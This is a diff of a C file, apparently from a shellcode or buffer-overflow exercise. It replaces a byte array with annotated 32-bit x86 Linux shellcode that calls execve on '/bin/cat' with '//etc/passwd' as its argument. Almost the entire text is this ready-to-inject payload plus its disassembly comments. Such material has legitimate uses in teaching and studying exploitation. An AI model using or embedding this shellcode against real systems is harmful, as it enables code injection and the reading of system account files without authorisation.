@@ -19,10 +19,22 @@ unsigned char opcodes[] = {
     0x53, 0x89, 0xe1, 0x8d, 0x42, 0x0b, 0xcd, 0x80,
 };
 
-char shellcode[] = {0x31, 0xd2, 0x52, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68, 0x2f,
-                    0x2f, 0x62, 0x69, 0x89, 0xe3, 0x52, 0x68, 0x2f, 0x63, 0x61,
-                    0x74, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0x56,
-                    0x53, 0x89, 0xe1, 0x8d, 0x42, 0x0b, 0xcd, 0x80};
+char shellcode[] = "\x31\xd2"             // xor    %edx,%edx
+                   "\x52"                 // push   %edx
+                   "\x68\x73\x73\x77\x64" // push   $0x64777373 ("sswd")
+                   "\x68\x2f\x2f\x70\x61" // push   $0x61702f2f ("//pa")
+                   "\x68\x2f\x65\x74\x63" // push   $0x6374652f ("/etc")
+                   "\x89\xe6"             // mov    %esp,%esi
+                   "\x52"                 // push   %edx
+                   "\x68\x2f\x63\x61\x74" // push   $0x7461632f ("/cat")
+                   "\x68\x2f\x62\x69\x6e" // push   $0x6e69622f ("/bin")
+                   "\x89\xe3"             // mov    %esp,%ebx
+                   "\x52"                 // push   %edx
+                   "\x56"                 // push   %esi
+                   "\x53"                 // push   %ebx
+                   "\x89\xe1"             // mov    %esp,%ecx
+                   "\x8d\x42\x0b"         // lea    0xb(%edx),%eax
+                   "\xcd\x80";            // int    $0x80
 
 /*
 08048400 <foo>:
